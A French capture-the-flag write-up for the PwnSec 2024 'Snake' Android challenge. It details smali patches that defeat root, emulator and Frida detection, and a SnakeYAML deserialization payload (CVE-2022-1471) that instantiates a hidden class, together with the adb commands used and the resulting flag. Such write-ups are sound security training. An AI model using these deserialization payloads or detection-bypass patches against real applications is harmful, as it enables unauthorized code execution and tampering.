# LAB 19 - Snake (PwnSec CTF 2024) - Mobile Hard

## Objectif

Exploiter une vulnérabilité de désérialisation SnakeYAML (CVE-2022-1471) dans une application Android protégée par des mécanismes anti-reverse (root, émulateur, Frida) afin d'instancier la classe cachée `BigBoss` et récupérer le flag.

---

## 1. Analyse statique (Jadx)

**Package principal :** `com.pwnsec.snake`

**Classe `MainActivity` :**
- Vérifie la présence d'un extra Intent nommé `SNAKE` avec la valeur `BigBoss`
- Accède au stockage externe (`/sdcard/Snake/Skull_Face.yml`)
- Parse le fichier YAML avec SnakeYAML (version 1.33)

**Classe `BigBoss` (cible de l'exploitation) :**
- Charge une librairie native via `System.loadLibrary("snake")`
- Constructeur prend une `String` en paramètre
- Si la chaîne est `"Snaaaaaaaaaaaaaake"` → appelle `stringFromJNI()`
- La fonction JNI génère et log le flag via `Log.d()`

**Protections identifiées :**
- Root detection (`Build.TAGS`, `su`, fichiers système)
- Emulator detection (`ro.hardware`, `ro.product.model`)
- Frida detection (librairie native)

---

## 2. Patch Smali (bypass des détections)

### Décompilation avec apktool

```bash
java -jar apktool.jar d snake.apk -o snake_smali
```

### Modifications appliquées

**Root detection :** Remplacer le corps de `isDeviceRooted` pour retourner `false`

```smali
.method public static isDeviceRooted(Landroid/content/Context;)Z
    .locals 1
    const/4 v0, 0x0
    return v0
.end method
```

**Emulator detection :** Même principe sur les méthodes `isEmulator` / `checkEmulator`

**Frida detection :** Patch des vérifications natives ou désactivation des appels JNI suspects

### Recompilation et signature

```bash
java -jar apktool.jar b snake_smali -o snake_patched.apk
java -jar uber-apk-signer.jar --apks snake_patched.apk
```

---

## 3. Création du payload YAML (CVE-2022-1471)

Fichier `Skull_Face.yml` placé dans `/sdcard/Snake/` :

```yaml
!!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaaake"]
```

- `!!com.pwnsec.snake.BigBoss` : Global tag YAML forçant l'instanciation directe de la classe Java
- `["Snaaaaaaaaaaaaaake"]` : Tableau contenant la chaîne attendue par le constructeur de `BigBoss`

---

## 4. Exploitation

```bash
# Création du dossier et push du payload
adb shell mkdir -p /sdcard/Snake
adb push Skull_Face.yml /sdcard/Snake/

# Installation de l'APK patchée
adb install snake_patched.apk

# Lancement avec l'Intent requis
adb shell am start -n com.pwnsec.snake/.MainActivity -e SNAKE BigBoss
```

---

## 5. Récupération du flag

```bash
adb logcat | grep -i "PWNSEC"
```

### Flag obtenu

```
PWNSEC{W3_r3_Not_To015_of_The_g0v3rnm3n7_OR_4nyOn3_31s3}
```

---

## Résumé du flux d'attaque

```
Intent SNAKE=BigBoss
    → MainActivity.C()
        → Lecture de /sdcard/Snake/Skull_Face.yml
            → Parse YAML (SnakeYAML 1.33)
                → Désérialisation unsafe (CVE-2022-1471)
                    → Instanciation de BigBoss("Snaaaaaaaaaaaaaake")
                        → System.loadLibrary("snake")
                            → stringFromJNI()
                                → Flag logué dans logcat
```

## Remarques

- La difficulté principale réside dans le contournement des protections anti-root/anti-frida par patching Smali
- La classe `BigBoss` n'est jamais appelée dans le code normal de l'application
- La vulnérabilité SnakeYAML permet un contournement total des protections via désérialisation arbitraire
- Le flag est généré dynamiquement en JNI (pas en clair dans l'APK)
